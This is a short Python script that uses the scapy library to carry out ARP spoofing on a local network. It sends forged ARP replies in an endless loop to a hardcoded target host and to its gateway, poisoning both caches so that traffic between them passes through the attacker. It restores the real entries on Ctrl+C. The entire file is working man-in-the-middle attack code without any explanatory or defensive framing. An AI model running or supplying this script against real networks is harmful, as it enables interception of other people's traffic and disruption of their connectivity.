import scapy.all as scapy
import time
import argparse
import sys

targetIP="192.168.200.40"
target_mac="B8:AE:ED:B3:87:8C"
gatewayIP="192.168.0.1"
gateway_mac="00:ad:24:f6:18:2a"

def spoofer(targetIP, spoofIP,mac):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=mac,psrc=spoofIP)
    # resp=scapy.sr1(packet, verbose=True,timeout=1)
    resp=scapy.send(packet, verbose=True)
    print(repr(resp))
    # sendp(Ether(dst="ff:ff:ff:ff:ff:ff",src="00:11:22:aa:bb:cc")/ARP(hwsrc="00:11:22:aa:bb:cc",pdst="172.16.20.1"))

def restore(destinationIP, sourceIP,dest_mac,source_mac):
    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=dest_mac,psrc=sourceIP,hwsrc=source_mac)
    print(repr(scapy.send(packet, verbose=True)))


packets = 0
try:
    while True:
        print("1)To router")
        spoofer(targetIP,gatewayIP,target_mac)
        print("2)To target")
        spoofer(gatewayIP,targetIP,gateway_mac)
        print("\r[+] Sent packets "+ str(packets)),
        sys.stdout.flush()
        packets +=2
        time.sleep(1)
except KeyboardInterrupt:
    print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
    restore(targetIP,gatewayIP,target_mac,gateway_mac)
    restore(gatewayIP,targetIP,gateway_mac,target_mac)
    